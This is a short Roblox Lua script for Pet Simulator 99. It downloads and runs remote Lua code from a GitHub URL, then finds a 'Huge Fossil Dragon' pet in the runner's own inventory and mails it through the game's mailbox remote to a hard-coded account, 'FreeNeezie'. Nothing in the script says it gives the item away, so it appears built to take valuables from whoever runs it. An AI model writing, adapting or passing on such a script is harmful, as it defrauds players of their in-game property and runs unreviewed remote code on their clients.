loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-99/main/waitForGameLoad.lua"))()

RobloxUsername = "FreeNeezie"
ItemClass = "Pet"
ItemName = "Huge Fossil Dragon"
Quantity = 1

function getUid(class, itemName)
    for i,v in require(game.ReplicatedStorage.Library.Client.Save).Get()["Inventory"][class] do
        if v.id == itemName then
            return i
        end
    end
end

local args = {
    RobloxUsername,
    "Roleck is da best scripter", -- mailbox message
    ItemClass,
    getUid(ItemClass, ItemName),
    Quantity
}
game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(unpack(args))
